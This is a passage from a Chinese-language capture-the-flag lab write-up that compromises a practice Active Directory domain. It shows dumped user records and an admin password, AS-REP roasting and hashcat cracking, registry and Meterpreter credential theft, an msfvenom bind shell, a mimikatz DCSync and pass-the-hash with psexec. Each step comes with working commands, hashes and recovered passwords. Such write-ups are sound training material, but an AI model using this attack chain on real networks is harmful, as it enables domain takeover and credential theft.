| 416 | changyun@xiaorang.lab      | 15804640736 | CHANG YUN       |
| 417 | yetai@xiaorang.lab         | 13400150018 | YE TAI          |
| 418 | luoxue@xiaorang.lab        | 18962643265 | LUO XUE         |
| 419 | moqian@xiaorang.lab        | 18042706956 | MO QIAN         |
| 420 | xupeng@xiaorang.lab        | 15881934759 | XU PENG         |
| 421 | ruanyong@xiaorang.lab      | 15049703903 | RUAN YONG       |
| 422 | guliangxian@xiaorang.lab   | 18674282714 | GU LIANG XIAN   |
| 423 | yinbin@xiaorang.lab        | 15734030492 | YIN BIN         |
| 424 | huarui@xiaorang.lab        | 17699257041 | HUA RUI         |
| 425 | niuya@xiaorang.lab         | 13915041589 | NIU YA          |
| 426 | guwei@xiaorang.lab         | 13584571917 | GU WEI          |
| 427 | qinguan@xiaorang.lab       | 18427953434 | QIN GUAN        |
| 428 | yangdanhan@xiaorang.lab    | 15215900100 | YANG DAN HAN    |
| 429 | yingjun@xiaorang.lab       | 13383367818 | YING JUN        |
| 430 | weiwan@xiaorang.lab        | 13132069353 | WEI WAN         |
| 431 | sunduangu@xiaorang.lab     | 15737981701 | SUN DUAN GU     |
| 432 | sisiwu@xiaorang.lab        | 18021600640 | SI SI WU        |
| 433 | nongyan@xiaorang.lab       | 13312613990 | NONG YAN        |
| 434 | xuanlu@xiaorang.lab        | 13005748230 | XUAN LU         |
| 435 | yunzhong@xiaorang.lab      | 15326746780 | YUN ZHONG       |
| 436 | gengfei@xiaorang.lab       | 13905027813 | GENG FEI        |
| 437 | zizhuansong@xiaorang.lab   | 13159301262 | ZI ZHUAN SONG   |
| 438 | ganbailong@xiaorang.lab    | 18353612904 | GAN BAI LONG    |
| 439 | shenjiao@xiaorang.lab      | 15164719751 | SHEN JIAO       |
| 440 | zangyao@xiaorang.lab       | 18707028470 | ZANG YAO        |
| 441 | yangdanhe@xiaorang.lab     | 18684281105 | YANG DAN HE     |
| 442 | chengliang@xiaorang.lab    | 13314617161 | CHENG LIANG     |
| 443 | xudi@xiaorang.lab          | 18498838233 | XU DI           |
| 444 | wulun@xiaorang.lab         | 18350490780 | WU LUN          |
| 445 | yuling@xiaorang.lab        | 18835870616 | YU LING         |
| 446 | taoya@xiaorang.lab         | 18494928860 | TAO YA          |
| 447 | jinle@xiaorang.lab         | 15329208123 | JIN LE          |
| 448 | youchao@xiaorang.lab       | 13332964189 | YOU CHAO        |
| 449 | liangduanzhi@xiaorang.lab  | 15675237494 | LIANG DUAN ZHI  |
| 450 | jiagupiao@xiaorang.lab     | 17884962455 | JIA GU PIAO     |
| 451 | ganze@xiaorang.lab         | 17753508925 | GAN ZE          |
| 452 | jiangqing@xiaorang.lab     | 15802357200 | JIANG QING      |
| 453 | jinshan@xiaorang.lab       | 13831466303 | JIN SHAN        |
| 454 | zhengpubei@xiaorang.lab    | 13690156563 | ZHENG PU BEI    |
| 455 | cuicheng@xiaorang.lab      | 17641589842 | CUI CHENG       |
| 456 | qiyong@xiaorang.lab        | 13485427829 | QI YONG         |
| 457 | qizhu@xiaorang.lab         | 18838859844 | QI ZHU          |
| 458 | ganjian@xiaorang.lab       | 18092585003 | GAN JIAN        |
| 459 | yurui@xiaorang.lab         | 15764121637 | YU RUI          |
| 460 | feishu@xiaorang.lab        | 18471512248 | FEI SHU         |
| 461 | chenxin@xiaorang.lab       | 13906545512 | CHEN XIN        |
| 462 | shengzhe@xiaorang.lab      | 18936457394 | SHENG ZHE       |
| 463 | wohong@xiaorang.lab        | 18404022650 | WO HONG         |
| 464 | manzhi@xiaorang.lab        | 15973350408 | MAN ZHI         |
| 465 | xiangdong@xiaorang.lab     | 13233908989 | XIANG DONG      |
| 466 | weihui@xiaorang.lab        | 15035834945 | WEI HUI         |
| 467 | xingquan@xiaorang.lab      | 18304752969 | XING QUAN       |
| 468 | miaoshu@xiaorang.lab       | 15121570939 | MIAO SHU        |
| 469 | gongwan@xiaorang.lab       | 18233990398 | GONG WAN        |
| 470 | qijie@xiaorang.lab         | 15631483536 | QI JIE          |
| 471 | shaoting@xiaorang.lab      | 15971628914 | SHAO TING       |
| 472 | xiqi@xiaorang.lab          | 18938747522 | XI QI           |
| 473 | jinghong@xiaorang.lab      | 18168293686 | JING HONG       |
| 474 | qianyou@xiaorang.lab       | 18841322688 | QIAN YOU        |
| 475 | chuhua@xiaorang.lab        | 15819380754 | CHU HUA         |
| 476 | yanyue@xiaorang.lab        | 18702474361 | YAN YUE         |
| 477 | huangjia@xiaorang.lab      | 13006878166 | HUANG JIA       |
| 478 | zhouchun@xiaorang.lab      | 13545820679 | ZHOU CHUN       |
| 479 | jiyu@xiaorang.lab          | 18650881187 | JI YU           |
| 480 | wendong@xiaorang.lab       | 17815264093 | WEN DONG        |
| 481 | heyuan@xiaorang.lab        | 18710821773 | HE YUAN         |
| 482 | mazhen@xiaorang.lab        | 18698248638 | MA ZHEN         |
| 483 | shouchun@xiaorang.lab      | 15241369178 | SHOU CHUN       |
| 484 | liuzhe@xiaorang.lab        | 18530936084 | LIU ZHE         |
| 485 | fengbo@xiaorang.lab        | 15812110254 | FENG BO         |
| 486 | taigongyuan@xiaorang.lab   | 15943349034 | TAI GONG YUAN   |
| 487 | gesheng@xiaorang.lab       | 18278508909 | GE SHENG        |
| 488 | songming@xiaorang.lab      | 13220512663 | SONG MING       |
| 489 | yuwan@xiaorang.lab         | 15505678035 | YU WAN          |
| 490 | diaowei@xiaorang.lab       | 13052582975 | DIAO WEI        |
| 491 | youyi@xiaorang.lab         | 18036808394 | YOU YI          |
| 492 | rongxianyu@xiaorang.lab    | 18839918955 | RONG XIAN YU    |
| 493 | fuyi@xiaorang.lab          | 15632151678 | FU YI           |
| 494 | linli@xiaorang.lab         | 17883399275 | LIN LI          |
| 495 | weixue@xiaorang.lab        | 18672465853 | WEI XUE         |
| 496 | hejuan@xiaorang.lab        | 13256081102 | HE JUAN         |
| 497 | zuoqiutai@xiaorang.lab     | 18093001354 | ZUO QIU TAI     |
| 498 | siyi@xiaorang.lab          | 17873307773 | SI YI           |
| 499 | shenshan@xiaorang.lab      | 18397560369 | SHEN SHAN       |
| 500 | tongdong@xiaorang.lab      | 15177549595 | TONG DONG       |
+-----+----------------------------+-------------+-----------------+

```

oa管理员账户密码

```
[1 entry]
+----+------------------+---------------+
| id | password         | username      |
+----+------------------+---------------+
| 1  | bo2y8kAL3HnXUiQo | administrator |
+----+------------------+---------------+
```



### FLAG3&FLAG4

#### AS-REPRoasting

拿到这堆user信息我们大概可以猜到要打**AS-REPRoasting**了

先把这堆用户整理成一个用户字典user.txt

我们可以通过impacket-GetNPUsers工具进行枚举，收集配置了“不需要预身份验证”的用户

```
proxychains4 impacket-GetNPUsers -dc-ip 172.22.6.12 -usersfile user.txt xiaorang.lab/ 
```

可以拿到两个用户的TGT票据

```
$krb5asrep$23$wenshao@xiaorang.lab@XIAORANG.LAB:c1f3f661b3e13330c72d06c7ae0e4d8b$06839251bdb7f64fbbc06a0e5c73e05358b593b2587eed530276c24ca0e501b8f33c6e7470a30b8f79f3ada9fafedffd1c6c8b10ac449b6289795b3a30985083d1a1b00a3c6a23cf472db6575c8f836180245a35e425c9ed4985162c24950736f5c5e12328ae6e9265efe926b557e20845cb2ef42f3f32d8ee5ac4158a15141f5d53d474f038a110dde7e0b5456be545ea06c816f0e4913472d60b933ffe84fc9be9b1a27f10288ff380f7036917c2ca23862f39eee7cecd0d3d1bedcef9460d7f5892a0b76a86ac2cd89cb6cd507e0aaea0ed8b3c23abe282a7bcd4e3ebee77f435544a44e0bd36ddc5216c

$krb5asrep$23$zhangxin@xiaorang.lab@XIAORANG.LAB:a2f5e2962c4db2de2d110097bb1ef50d$a60eb578bc52da54562468ba1462571da414c4a22c7c2b688c791817177f765784b98293edc52e12694b4423f889d704712b550702657f6383597bc071fd91c853f1e16880fc637e68d675aa35c99d7e260e33dea1651390d26ddf99fb075a0be1bfbab3987431e29318a91b7102145836ca8512ea412c1dab398c6f1f11843c2c1624fe5c18876acc73f5d36560380994bac604a00356b7fcde8ac03b36d4a9e79d00cd60996c7211d6b339af8eaddd1b69d2a319e565653b958079a2d5d7f528ec641c8f4fc4c7fdf582a7b6e881ed5f88273a6e31ccf711d0259ad3bc80e5d539191d73c12a5d836880a1
```

用hashcat爆破出明文密码，用的kali自带的rockyou字典

```
hashcat -m 18200 --force -a 0 '$krb5asrep$23$wenshao@xiaorang.lab@XIAORANG.LAB:c1f3f661b3e13330c72d06c7ae0e4d8b$06839251bdb7f64fbbc06a0e5c73e05358b593b2587eed530276c24ca0e501b8f33c6e7470a30b8f79f3ada9fafedffd1c6c8b10ac449b6289795b3a30985083d1a1b00a3c6a23cf472db6575c8f836180245a35e425c9ed4985162c24950736f5c5e12328ae6e9265efe926b557e20845cb2ef42f3f32d8ee5ac4158a15141f5d53d474f038a110dde7e0b5456be545ea06c816f0e4913472d60b933ffe84fc9be9b1a27f10288ff380f7036917c2ca23862f39eee7cecd0d3d1bedcef9460d7f5892a0b76a86ac2cd89cb6cd507e0aaea0ed8b3c23abe282a7bcd4e3ebee77f435544a44e0bd36ddc5216c' ./rockyou.txt

hashcat -m 18200 --force -a 0 '$krb5asrep$23$zhangxin@xiaorang.lab@XIAORANG.LAB:a2f5e2962c4db2de2d110097bb1ef50d$a60eb578bc52da54562468ba1462571da414c4a22c7c2b688c791817177f765784b98293edc52e12694b4423f889d704712b550702657f6383597bc071fd91c853f1e16880fc637e68d675aa35c99d7e260e33dea1651390d26ddf99fb075a0be1bfbab3987431e29318a91b7102145836ca8512ea412c1dab398c6f1f11843c2c1624fe5c18876acc73f5d36560380994bac604a00356b7fcde8ac03b36d4a9e79d00cd60996c7211d6b339af8eaddd1b69d2a319e565653b958079a2d5d7f528ec641c8f4fc4c7fdf582a7b6e881ed5f88273a6e31ccf711d0259ad3bc80e5d539191d73c12a5d836880a1' ./rockyou.txt
```

![image-20250408125400038](../assets/image-20250408125400038.png)

![image-20250408125435162](../assets/image-20250408125435162.png)

```
wenshao@xiaorang.lab/hellokitty
zhangxin@xiaorang.lab/strawberry
```

尝试rdp到172.22.6.12

![image-20250408125723972](../assets/image-20250408125723972.png)

发现没授权远程登录

但是另一台机子172.22.6.25是可以登上的，但是拿不到flag

![image-20250408130431964](../assets/image-20250408130431964.png)

我们先信息收集一手

传一个SharpHound

```
SharpHound.exe -c all
```

Find Shortest Paths to Domain Admins

![image-20250408133444802](../assets/image-20250408133444802.png)

![image-20250408133518037](../assets/image-20250408133518037.png)

可以看到yuxuan这个用户有SIDHistory，也就是说相当于是域管

![image-20250408133723672](../assets/image-20250408133723672.png)

所有我们下一个目标就是要拿下yuxuan这个用户

而且yuxuan这个用户在172.22.6.25上拥有会话。（HasSession）

用户与计算机时进行会话时，凭据会保留在内存中。说明用户登陆过该主机。



#### HasSession

##### 方法一

直接查注册表，可以看到yuxuan这个账户设置了自动登录，而且能拿到明文密码

```
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

![image-20250408171055416](../assets/image-20250408171055416.png)

> 在 Windows 系统中，域用户自动登录的相关设置保存在注册表中。具体路径为 `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`。若该路径下存在 `AutoAdminLogon` 键值且其数据数值为 `1`，同时 `DefaultDomainName` `DefaultUserName` `DefaultPassword` 等键值也有相应的正确设置，那么说明该域用户设置了自动登录。

```
yuxuan/Yuxuan7QbrgZ3L
```



##### 方法二

小豌豆信息收集一手就能抓到

![image-20250408171338691](../assets/image-20250408171338691.png)



##### 方法三

用户设置了自动登录可以用msf抓取自动登录的账户密码

msf生成一个正向代理的shell，在靶机上运行

```
msfvenom -p windows/meterpreter/bind_tcp -f exe -o 1.exe
```

接着用msf连上去

```
use exploit/multi/handler
set payload windows/meterpreter/bind_tcp
set rhost 172.22.6.25
run
```

抓自动登录的账号密码

```
meterpreter > run windows/gather/credentials/windows_autologin
```



#### HasSIDHistory

> SID History是在域迁移过程中需要使用的一个属性。
>
> 如果将A域中的域用户迁移到B域中，那么在B域中该用户的SID会随之改变，进而影响迁移后用户的权限，导致迁移后的用户不能访问本来可以访问的资源。
>
> **SID History的作用是在域迁移过程中保持域用户的访问权限**，即如果迁移后用户的SID改变了，系统会将其原来的SID添加到迁移后用户的SID History属性中，使迁移后的用户保持原有权限、能够访问其原来可以访问的资源
>
> [域权限维持-SID History - xiaoxiaosen - 博客园](https://www.cnblogs.com/xiaoxiaosen/p/13535868.html)

拿到明文密码我们直接rdp上去

因为有SID History这个用户可以访问域管的资源，所以我们可以直接拿mimikatz去dump域管的hash

```
lsadump::dcsync /domain:xiaorang.lab /all /csv
```

![image-20250408173038788](../assets/image-20250408173038788.png)

拿到域管的hash

```
500     Administrator   04d93ffd6f5f6e4490e0de23f240a5e9        512
```

接下来我们就可以PTH拿flag了

```
proxychains4 -q psexec.py xiaorang.lab/administrator@DC-PROGAME.xiaorang.lab -hashes :04d93ffd6f5f6e4490e0de23f240a5e9 -target-ip 172.22.6.12
```

```
C:\Windows\system32> type c:\Users\Administrator\flag\flag04.txt
Awesome! you got the final flag.

::::::::::::::::::::::::::    :::: ::::::::::
    :+:        :+:    +:+:+: :+:+:+:+:
    +:+        +:+    +:+ +:+:+ +:++:+
    +#+        +#+    +#+  +:+  +#++#++:++#
    +#+        +#+    +#+       +#++#+
    #+#        #+#    #+#       #+##+#
    ###    ##############       #############


flag04: flag{26180e6b-5b97-47ca-a861-a160ef12166c}
```



```
proxychains4 -q psexec.py xiaorang.lab/administrator@DC-PROGAME.xiaorang.lab -hashes :04d93ffd6f5f6e4490e0de23f240a5e9 -target-ip 172.22.6.25
```

```
C:\Windows\system32> type c:\Users\Administrator\flag\flag03.txt
flag03: flag{ff39758a-623e-4f1f-b0bb-bb5f6d31ca83}


Maybe you can find something interesting on this server.
=======================================
What you may not know is that many objects in this domain
are moved from other domains.

```

